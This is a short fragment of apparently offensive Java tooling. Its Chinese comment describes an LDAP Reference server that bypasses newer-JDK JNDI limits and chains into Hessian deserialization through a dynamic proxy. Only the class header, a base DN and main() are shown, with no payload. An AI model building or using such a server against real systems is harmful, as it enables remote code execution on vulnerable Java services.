...
/**
 * Ldap 使用 Ref 绕过高版本 jdk 限制，ObjectFactory 指向Hessian，通过 Hessian 的动态代理触发 Hessian 反序列化，需要 lookup 到对象后，执行对象的任意方法才能触发。
 */
public class LdapRefServer1 implements Runnable {

    private static final String LDAP_BASE = "dc=example,dc=com";


    public static void main (String[] args) {
        new LdapRefServer1().run();
    }
